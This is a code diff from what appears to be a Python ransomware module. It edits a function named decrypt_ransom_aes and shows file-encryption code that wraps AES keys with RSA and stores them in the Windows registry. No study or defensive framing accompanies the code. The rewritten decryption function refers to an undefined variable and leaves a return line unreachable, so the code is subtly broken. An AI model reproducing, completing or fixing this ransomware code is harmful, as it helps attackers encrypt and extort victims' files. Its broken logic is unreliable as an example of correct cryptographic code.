@@ -232,32 +232,25 @@ def decrypt_ransom_aes(ciphertext, key, padding=chr(0)):
 
     """
     try:
-        # if isinstance(key, str):
-        #     key = key.encode("utf-8")
-
-        # Decode the Base64-encoded ciphertext
-        # try:
-        #     ciphertext = base64.b64decode(ciphertext_b64)
-        # except:
-        #     print('it was b64')
-        #     return 'it was b64'
-
-        data = BytesIO(base64.b64decode(ciphertext))
+        # Decode the base64-encoded input
+        data = BytesIO(base64.b64decode(encrypted))
         
         # Extract nonce, tag, and ciphertext from the combined output
-        nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
-
+        nonce_size = 12  # Typically 12 bytes for AES-OCB
+        tag_size = 16    # Standard tag size
+        nonce = data.read(nonce_size)
+        tag = data.read(tag_size)
+        ciphertext = data.read()  # Remaining bytes
+        
         # Initialize the cipher with the nonce
-        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce=nonce)
+        cipher = AES.new(key, AES.MODE_OCB, nonce=nonce)
         
         # Decrypt and verify the ciphertext
-        plaintext = cipher.decrypt(str(ciphertext))
-
+        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+        return plaintext
     except Exception as e:
-        log("{} error: {}".format(decrypt_ransom_aes.__name__, str(e)))
-        print(traceback.format_exc())
+        print(f"Decryption error: {e}")
         raise
-
 
     return plaintext.decode("utf-8", errors="ignore")
 
@@ -299,6 +292,7 @@ def encrypt_file(filename, rsa_key):
             fd.write(ciphertext)
 
         key = base64.b64encode(cipher.encrypt(aes_key))
+
         if sys.platform == 'win32':
             registry_key(globals()['registry_key'], filename, key)
         elif sys.platform == 'linux' or sys.platform == 'linux2':
